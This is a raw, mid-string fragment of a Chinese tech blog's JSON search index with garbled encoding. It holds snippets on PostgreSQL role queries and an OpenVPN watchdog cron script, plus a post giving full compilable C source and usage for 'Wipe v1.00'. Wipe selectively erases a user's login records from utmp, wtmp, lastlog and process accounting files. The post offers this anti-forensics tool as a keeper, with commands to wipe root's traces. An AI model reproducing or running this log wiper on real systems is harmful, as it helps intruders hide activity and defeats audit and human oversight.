class=\"c1\"\u003e#åˆ—å‡ºæ‰€æœ‰çš„schema\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\\d\u003c/span\u003en\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#çœ‹schema.publicæƒé™\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\\d\u003c/span\u003en+ public\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#åˆ—å‡ºæ‰€æœ‰çš„å¯¹è±¡ï¼ˆtable, view, sequencesï¼‰\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\\d\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#åˆ—å‡ºæ‰€æœ‰çš„è§’è‰²\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\\d\u003c/span\u003eu\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#åˆ—å‡ºæ‰€æœ‰è¡¨\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\\d\u003c/span\u003et\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#åˆ—å‡ºæ‰€æœ‰ç´¢å¼•\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\\d\u003c/span\u003ei\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#åŒæ ·çš„sql\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eselect\u003c/span\u003e * from pg_roles\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#çœ‹çœ‹èƒ½ç™»å½•çš„ç”¨æˆ·æœ‰å“ªäº›\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eselect\u003c/span\u003e * from pg_user\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé‚£è‡ªé¡¶å‘ä¸‹å¼€å§‹ï¼š\u003c/p\u003e","title":"PostgreSQLçš„ç”¨æˆ·æƒé™ç®¡ç†"},{"content":"ä¸€äº›Openvpné—®é¢˜ï¼š\nä¸€ã€OpenVPN - ERROR: Cannot open TUN/TAP dev /dev/net/tun: No such file or directory (errno=2)\næ²¡æœ‰tunè®¾å¤‡ï¼Œå»ºä¸€ä¸ªå°±è¡Œï¼š\nmkdir -p /dev/net mknod /dev/net/tun c 10 200 chmod 600 /dev/net/tun äºŒã€vpnè¿›ç¨‹æ‰äº†\nåŠ ä¸€ä¸ªcrontabï¼Œå®šæ—¶æ£€æµ‹ï¼Œæ²¡æœ‰å°±é‡å¯\n*/1 * * * * /usr/local/bin/vpn.sh cat /usr/local/bin/vpn.cn #!/bin/bash vpn_pid=$(ps ax|grep openvpn|grep -v grep|awk \u0026#39;{print $1}\u0026#39;) if [[ ! -n \u0026#34;$vpn_pid\u0026#34; ]]; then datetime=$(date +\u0026#34;%Y%m%d %H:%M:%S\u0026#34;) echo \u0026#34;Restart openvpn at $datetime\u0026#34; \u0026gt;\u0026gt; /tmp/r.txt sleep 5 /app/openvpn/sbin/openvpn --config /etc/openvpn/conf/client1.conf --daemon fi ","permalink":"https://rendoumi.com/posts/20240130-openvpn_problem/","summary":"\u003cp\u003eä¸€äº›Openvpné—®é¢˜ï¼š\u003c/p\u003e\n\u003cp\u003eä¸€ã€OpenVPN - ERROR: Cannot open TUN/TAP dev /dev/net/tun: No such file or directory (errno=2)\u003c/p\u003e\n\u003cp\u003eæ²¡æœ‰tunè®¾å¤‡ï¼Œå»ºä¸€ä¸ªå°±è¡Œï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p /dev/net\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emknod /dev/net/tun c \u003cspan class=\"m\"\u003e10\u003c/span\u003e \u003cspan class=\"m\"\u003e200\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod \u003cspan class=\"m\"\u003e600\u003c/span\u003e /dev/net/tun\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eäºŒã€vpnè¿›ç¨‹æ‰äº†\u003c/p\u003e\n\u003cp\u003eåŠ ä¸€ä¸ªcrontabï¼Œå®šæ—¶æ£€æµ‹ï¼Œæ²¡æœ‰å°±é‡å¯\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e*/1 * * * * /usr/local/bin/vpn.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /usr/local/bin/vpn.cn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#!/bin/bash\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003evpn_pid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003eps ax\u003cspan class=\"p\"\u003e|\u003c/span\u003egrep openvpn\u003cspan class=\"p\"\u003e|\u003c/span\u003egrep -v grep\u003cspan class=\"p\"\u003e|\u003c/span\u003eawk \u003cspan class=\"s1\"\u003e\u0026#39;{print $1}\u0026#39;\u003c/span\u003e\u003cspan class=\"k\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[[\u003c/span\u003e ! -n \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$vpn_pid\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nv\"\u003edatetime\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003edate +\u003cspan class=\"s2\"\u003e\u0026#34;%Y%m%d %H:%M:%S\u0026#34;\u003c/span\u003e\u003cspan class=\"k\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;Restart openvpn at \u003c/span\u003e\u003cspan class=\"nv\"\u003e$datetime\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u0026gt;\u0026gt; /tmp/r.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  sleep \u003cspan class=\"m\"\u003e5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  /app/openvpn/sbin/openvpn --config /etc/openvpn/conf/client1.conf --daemon\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Openvpn çš„ä¸€äº›é—®é¢˜"},{"content":"Linuxä¸‹çš„æ—¥å¿—æ“¦é™¤è½¯ä»¶ï¼Œæ— è§£é‡Šçè—ï¼š\ngcc -O3 -DHAVE_LASTLOG_H -DNO_ACCT -o wipe wipe.c wipe u root #w å‘½ä»¤æ“¦æ‰åœ¨çº¿çš„root wipe w root #last å‘½ä»¤æ“¦æ‰root wipe l root #lastlog å‘½ä»¤æ“¦æ‰rootç™»å½•è®°å½• æºç å¦‚ä¸‹ï¼š\n/* * Wipe v1.00. * * Written by The Crawler. * * Selectively wipe system logs. * * Usage: wipe [l,u,w] username * ex: wipe l user;wipe u user;wipe w user * * Wipes logs on, but not including, Linux, FreeBSD, Sunos 4.x, Solaris 2.x, * Ultrix, AIX, IRIX, Digital UNIX, BSDI, NetBSD, HP/UX. * compile with -DHAVE_LASTLOG_H -DNO_ACCT */ #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/uio.h\u0026gt; #ifndef NO_ACCT #include \u0026lt;sys/acct.h\u0026gt; #endif #include \u0026lt;utmp.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;pwd.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #ifdef HAVE_LASTLOG_H #include \u0026lt;lastlog.h\u0026gt; #endif #ifdef HAVE_UTMPX #include \u0026lt;utmpx.h\u0026gt; #endif /* * Try to use the paths out of the include files. * But if we can\u0026#39;t find any, revert to the defaults. */ #ifndef UTMP_FILE #ifdef _PATH_UTMP #define UTMP_FILE\t_PATH_UTMP #else #define UTMP_FILE\t\u0026#34;/var/adm/utmp\u0026#34; #endif #endif #ifndef WTMP_FILE #ifdef _PATH_WTMP #define WTMP_FILE\t_PATH_WTMP #else #define WTMP_FILE\t\u0026#34;/var/adm/wtmp\u0026#34; #endif #endif #ifndef LASTLOG_FILE #ifdef _PATH_LASTLOG #define LASTLOG_FILE\t_PATH_LASTLOG #else #define LASTLOG_FILE\t\u0026#34;/var/adm/lastlog\u0026#34; #endif #endif #ifndef ACCT_FILE #define ACCT_FILE\t\u0026#34;/var/adm/pacct\u0026#34; #endif #ifdef HAVE_UTMPX #ifndef UTMPX_FILE #define UTMPX_FILE\t\u0026#34;/var/adm/utmpx\u0026#34; #endif #ifndef WTMPX_FILE #define WTMPX_FILE\t\u0026#34;/var/adm/wtmpx\u0026#34; #endif #endif /* HAVE_UTMPX */ #define BUFFSIZE\t8192 /* * This function will copy the src file to the dst file. */ void copy_file(char *src, char *dst) { int fd1, fd2; int\tn; char\tbuf[BUFFSIZE]; if ( (fd1 = open(src, O_RDONLY)) \u0026lt; 0 ) { fprintf(stderr, \u0026#34;ERROR: Opening %s during copy.\\n\u0026#34;, src); return; } if ( (fd2 = open(dst, O_WRONLY | O_CREAT | O_TRUNC)) \u0026lt; 0 ) { fprintf(stderr, \u0026#34;ERROR: Creating %s during copy.\\n\u0026#34;, dst); return; } while ( (n = read(fd1, buf, BUFFSIZE)) \u0026gt; 0) if (write(fd2, buf, n) != n) { fprintf(stderr, \u0026#34;ERROR: Write error during copy.\\n\u0026#34;); return; } if (n \u0026lt; 0) { fprintf(stderr, \u0026#34;ERROR: Read error during copy.\\n\u0026#34;); return; } close(fd1); close(fd2); } /* * UTMP editing. */ void wipe_utmp(char *who, char *line) { int fd1; struct utmp\tut; printf(\u0026#34;Patching %s .... \u0026#34;, UTMP_FILE); fflush(stdout); /* * Open the utmp file. */ if ( (fd1 = open(UTMP_FILE, O_RDWR)) \u0026lt; 0 ) { fprintf(stderr, \u0026#34;ERROR: Opening %s\\n\u0026#34;, UTMP_FILE); return; } /* * Copy utmp file excluding relevent entries. */\twhile ( read(fd1, \u0026amp;ut, sizeof(ut)) \u0026gt; 0) if ( !strncmp(ut.ut_name, who, strlen(who)) ) if (!line || (line \u0026amp;\u0026amp; !strncmp(ut.ut_line, line, strlen(line)))) { bzero((char *) \u0026amp;ut, sizeof(ut)); lseek(fd1, (int) -sizeof(ut), SEEK_CUR); write(fd1, \u0026amp;ut, sizeof(ut)); } close(fd1); printf(\u0026#34;Done.\\n\u0026#34;); } /* * UTMPX editing if supported. */ #ifdef HAVE_UTMPX void wipe_utmpx(char *who, char *line) { int fd1; struct utmpx\tutx; printf(\u0026#34;Patching %s .... \u0026#34;, UTMPX_FILE); fflush(stdout); /* * Open the utmp file and temporary file. */ if ( (fd1 = open(UTMPX_FILE, O_RDWR)) \u0026lt; 0 ) { fprintf(stderr, \u0026#34;ERROR: Opening %s\\n\u0026#34;, UTMPX_FILE); return; } while ( (read(fd1, \u0026amp;utx, sizeof(utx)) ) \u0026gt; 0) if ( !strncmp(utx.ut_name, who, strlen(who)) ) if (!line || (line \u0026amp;\u0026amp; !strncmp(utx.ut_line, line, strlen(line)))) { bzero((char *) \u0026amp;utx, sizeof(utx)); lseek(fd1, (int) -sizeof(utx), SEEK_CUR); write(fd1, \u0026amp;utx, sizeof(utx)); } close(fd1); printf(\u0026#34;Done.\\n\u0026#34;); } #endif /* * WTMP editing. */ void wipe_wtmp(char *who, char *line) { int\tfd1; struct utmp\tut; printf(\u0026#34;Patching %s .... \u0026#34;, WTMP_FILE); fflush(stdout); /* * Open the wtmp file and temporary file. */ if ( (fd1 = open(WTMP_FILE, O_RDWR)) \u0026lt; 0 ) { fprintf(stderr, \u0026#34;ERROR: Opening %s\\n\u0026#34;, WTMP_FILE); return; } /* * Determine offset of last relevent entry. */ lseek(fd1, (long) -(sizeof(ut)), SEEK_END); while ( (read (fd1, \u0026amp;ut, sizeof(ut))) \u0026gt; 0) { if (!strncmp(ut.ut_name, who, strlen(who))) if (!line || (line \u0026amp;\u0026amp; !strncmp(ut.ut_line, line, strlen(line)))) { bzero((char *) \u0026amp;ut, sizeof(ut)); lseek(fd1, (long) -(sizeof(ut)), SEEK_CUR); write(fd1, \u0026amp;ut, sizeof(ut)); break; } lseek(fd1, (long) -(sizeof(ut) * 2), SEEK_CUR); } close(fd1); printf(\u0026#34;Done.\\n\u0026#34;); } /* * WTMPX editing if supported. */ #ifdef HAVE_UTMPX void wipe_wtmpx(char *who, char *line) { int fd1; struct utmpx\tutx; printf(\u0026#34;Patching %s .... \u0026#34;, WTMPX_FILE); fflush(stdout); /* * Open the utmp file and temporary file. */ if ( (fd1 = open(WTMPX_FILE, O_RDWR)) \u0026lt; 0 ) { fprintf(stderr, \u0026#34;ERROR: Opening %s\\n\u0026#34;, WTMPX_FILE); return; } /* * Determine offset of last relevent entry. */ lseek(fd1, (long) -(sizeof(utx)), SEEK_END); while ( (read (fd1, \u0026amp;utx, sizeof(utx))) \u0026gt; 0) { if (!strncmp(utx.ut_name, who, strlen(who))) if (!line || (line \u0026amp;\u0026amp; !strncmp(utx.ut_line, line, strlen(line)))) { bzero((char *) \u0026amp;utx, sizeof(utx)); lseek(fd1, (long) -(sizeof(utx)), SEEK_CUR); write(fd1, \u0026amp;utx, sizeof(utx)); break; } lseek(fd1, (int) -(sizeof(utx) * 2), SEEK_CUR); } close(fd1); printf(\u0026#34;Done.\\n\u0026#34;); } #endif /* * LASTLOG editing. */ void wipe_lastlog(char *who, char *line, char *timestr, char *host) { int\tfd1; struct lastlog\tll; struct passwd\t*pwd; struct tm\t*tm; char\tstr[4]; printf(\u0026#34;Patching %s .... \u0026#34;, LASTLOG_FILE); fflush(stdout); tm = (struct tm *) malloc( sizeof(struct tm) ); /* * Open the lastlog file. */ if ( (fd1 = open(LASTLOG_FILE, O_RDWR)) \u0026lt; 0 ) { fprintf(stderr, \u0026#34;ERROR: Opening %s\\n\u0026#34;, LASTLOG_FILE); return; } if ( (pwd = getpwnam(who)) == NULL) { fprintf(stderr, \u0026#34;ERROR: Can\u0026#39;t find user in passwd.\\n\u0026#34;); return; } lseek(fd1, (long) pwd-\u0026gt;pw_uid * sizeof(struct lastlog), 0); bzero((char *) \u0026amp;ll, sizeof(ll)); if (line) strncpy(ll.ll_line, line, strlen(line)); if (timestr) { /* YYMMddhhmm */ if (strlen(timestr) != 10) { fprintf(stderr, \u0026#34;ERROR: Time format is YYMMddhhmm.\\n\u0026#34;); return; } /* * Extract Times. */ str[2] = 0; str[0] = timestr[0]; str[1] = timestr[1]; tm-\u0026gt;tm_year = atoi(str); str[0] = timestr[2]; str[1] = timestr[3]; tm-\u0026gt;tm_mon = atoi(str) - 1; str[0] = timestr[4]; str[1] = timestr[5]; tm-\u0026gt;tm_mday = atoi(str); str[0] = timestr[6]; str[1] = timestr[7]; tm-\u0026gt;tm_hour = atoi(str); str[0] = timestr[8]; str[1] = timestr[9]; tm-\u0026gt;tm_min = atoi(str); tm-\u0026gt;tm_sec = 0; ll.ll_time = mktime(tm); } if (host) strncpy(ll.ll_host, host, sizeof(ll.ll_host)); write(fd1, (char *) \u0026amp;ll, sizeof(ll)); close(fd1); printf(\u0026#34;Done.\\n\u0026#34;); } #ifndef NO_ACCT /* * ACCOUNT editing. */ void wipe_acct(char *who, char *line) { int\tfd1, fd2; struct acct\tac; char\tttyn[50]; struct passwd *pwd; struct stat\tsbuf; char\t*tmpf; printf(\u0026#34;Patching %s .... \u0026#34;, ACCT_FILE); fflush(stdout); /* * Open the acct file and temporary file. */ if ( (fd1 = open(ACCT_FILE, O_RDONLY)) \u0026lt; 0 ) { fprintf(stderr, \u0026#34;ERROR: Opening %s\\n\u0026#34;, ACCT_FILE); return; } /* * Grab a unique temporary filename. */ tmpf = tmpnam((char *) NULL); if ( (fd2 = open(tmpf, O_WRONLY | O_CREAT | O_TRUNC, 600)) \u0026lt; 0 ) { fprintf(stderr, \u0026#34;ERROR: Opening tmp ACCT file\\n\u0026#34;); return; } if ( (pwd = getpwnam(who)) == NULL) { fprintf(stderr, \u0026#34;ERROR: Can\u0026#39;t find user in passwd.\\n\u0026#34;); return; } /* * Determine tty\u0026#39;s device number */ strcpy(ttyn, \u0026#34;/dev/\u0026#34;); strcat(ttyn, line); if (stat(ttyn, \u0026amp;sbuf) \u0026lt; 0) { fprintf(stderr, \u0026#34;ERROR: Determining tty device number.\\n\u0026#34;); return; } while ( read(fd1, \u0026amp;ac, sizeof(ac)) \u0026gt; 0 ) { if ( !(ac.ac_uid == pwd-\u0026gt;pw_uid \u0026amp;\u0026amp; ac.ac_tty == sbuf.st_rdev) )\twrite(fd2, \u0026amp;ac, sizeof(ac)); } close(fd1); close(fd2); copy_file(tmpf, ACCT_FILE); if ( unlink(tmpf) \u0026lt; 0 ) { fprintf(stderr, \u0026#34;ERROR: Unlinking tmp WTMP file.\\n\u0026#34;); return; } printf(\u0026#34;Done.\\n\u0026#34;); } #endif void usage() { printf(\u0026#34;USAGE: wipe [ u|w|l|a ] ...options...\\n\u0026#34;); printf(\u0026#34;\\n\u0026#34;); printf(\u0026#34;UTMP editing:\\n\u0026#34;); printf(\u0026#34; Erase all usernames : wipe u [username]\\n\u0026#34;); printf(\u0026#34; Erase one username on tty: wipe u [username] [tty]\\n\u0026#34;); printf(\u0026#34;\\n\u0026#34;); printf(\u0026#34;WTMP editing:\\n\u0026#34;); printf(\u0026#34; Erase last entry for user : wipe w [username]\\n\u0026#34;); printf(\u0026#34; Erase last entry on tty : wipe w [username] [tty]\\n\u0026#34;); printf(\u0026#34;\\n\u0026#34;);\tprintf(\u0026#34;LASTLOG editing:\\n\u0026#34;); printf(\u0026#34; Blank lastlog for user : wipe l [username]\\n\u0026#34;); printf(\u0026#34; Alter lastlog entry : wipe l [username] [tty] [time] [host]\\n\u0026#34;); printf(\u0026#34;\tWhere [time] is in the format [YYMMddhhmm]\\n\u0026#34;); printf(\u0026#34;\\n\u0026#34;); #ifndef NO_ACCT printf(\u0026#34;ACCT editing:\\n\u0026#34;); printf(\u0026#34; Erase acct entries on tty : wipe a [username] [tty]\\n\u0026#34;); #endif exit(1); } int main(int argc, char *argv[]) { char\tc; if (argc \u0026lt; 3) usage(); /* * First character of first argument determines which file to edit. */ c = toupper(argv[1][0]); /* * UTMP editing. */ switch (c) { /* UTMP */ case \u0026#39;U\u0026#39; : if (argc == 3) wipe_utmp(argv[2], (char *) NULL); if (argc ==4) wipe_utmp(argv[2], argv[3]); #ifdef HAVE_UTMPX if (argc == 3) wipe_utmpx(argv[2], (char *) NULL); if (argc == 4) wipe_utmpx(argv[2], argv[3]); #endif break; /* WTMP */ case \u0026#39;W\u0026#39; : if (argc == 3) wipe_wtmp(argv[2], (char *) NULL); if (argc == 4) wipe_wtmp(argv[2], argv[3]); #ifdef HAVE_UTMPX if (argc == 3) wipe_wtmpx(argv[2], (char *) NULL); if (argc == 4) wipe_wtmpx(argv[2], argv[3]); #endif break; /* LASTLOG */ case \u0026#39;L\u0026#39; : if (argc == 3) wipe_lastlog(argv[2], (char *) NULL, (char *) NULL, (char *) NULL); if (argc == 4) wipe_lastlog(argv[2], argv[3], (char *) NULL, (char *) NULL); if (argc == 5) wipe_lastlog(argv[2], argv[3], argv[4], (char *) NULL); if (argc == 6) wipe_lastlog(argv[2], argv[3], argv[4], argv[5]); break; #ifndef NO_ACCT /* ACCT */ case \u0026#39;A\u0026#39; : if (argc != 4) usage(); wipe_acct(argv[2], argv[3]); break; #endif } return(0); } ","permalink":"https://rendoumi.com/posts/20240129-wipe_linux/","summary":"\u003cp\u003eLinuxä¸‹çš„æ—¥å¿—æ“¦é™¤è½¯ä»¶ï¼Œæ— è§£é‡Šçè—ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egcc -O3  -DHAVE_LASTLOG_H -DNO_ACCT -o wipe wipe.c\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewipe u root \u003cspan class=\"c1\"\u003e#w å‘½ä»¤æ“¦æ‰åœ¨çº¿çš„root\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewipe w root \u003cspan class=\"c1\"\u003e#last å‘½ä»¤æ“¦æ‰root\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewipe l root \u003cspan class=\"c1\"\u003e#lastlog å‘½ä»¤æ“¦æ‰rootç™»å½•è®°å½•\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæºç å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-c\" data-lang=\"c\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * Wipe v1.00.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e *\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * Written by The Crawler.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e *\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * Selectively wipe system logs.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e *\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * Usage: wipe [l,u,w] username\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * ex:    wipe l user;wipe u user;wipe w user\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e *\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * Wipes logs on, but not including, Linux, FreeBSD, Sunos 4.x, Solaris 2.x,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e *      Ultrix, AIX, IRIX, Digital UNIX, BSDI, NetBSD, HP/UX.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * compile with  -DHAVE_LASTLOG_H -DNO_ACCT */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;sys/types.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;sys/stat.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;sys/uio.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifndef NO_ACCT\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;sys/acct.h\u0026gt;\u003c/span\u003e\u003cspan 